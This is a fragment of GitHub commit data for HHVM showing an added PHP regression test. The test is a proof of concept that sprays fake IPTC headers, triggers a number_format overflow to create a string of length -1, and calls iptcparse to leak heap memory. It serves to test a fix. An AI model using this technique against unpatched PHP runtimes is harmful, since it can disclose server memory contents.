+<?php
+  $READ_LENGTH = 0x1000; // choose leak size
+// construct fake iptc header for controlled read
+$iptc_hdr =
+  "\x1c\x01" . // magic
+  "\x00\x80" . // dataset, recnum
+  "\x00" .     // padding
+  pack("N", $READ_LENGTH);
+// spray a bit so it's near the broken string
+$holder = [];
+for($i = 0; $i < 100; $i++)
+  $holder[] = str_pad($iptc_hdr, 96);
+// trigger bug to create string with len=-1
+$badstr = number_format(0,0x7fffffff);
+var_dump($badstr);
+// leak memory :)
+$tmp = iptcparse($badstr);
+var_dump($tmp);
+?>"}<_**next**_>{"sha": "4cbe7ce9a7853aabfff1d3e7bead7016581fc906", "filename": "hphp/test/slow/string/number_format_error.php.expect", "status": "added", "additions": 2, "deletions": 0, "changes": 2, "blob_url": "https://github.com/facebook/hhvm/blob/190ffdf6c8b1ec443be202c7d69e63a7e3da25e3/hphp/test/slow/string/number_format_error.php.expect", "raw_url": "https://github.com/facebook/hhvm/raw/190ffdf6c8b1ec443be202c7d69e63a7e3da25e3/hphp/test/slow/string/number_format_error.php.expect", "contents_url": "https://api.github.com/repos/facebook/hhvm/contents/hphp/test/slow/string/number_format_error.php.expect?ref=190ffdf6c8b1ec443be202c7d69e63a7e3da25e3", "patch": "@@ -0,0 +1,2 @@
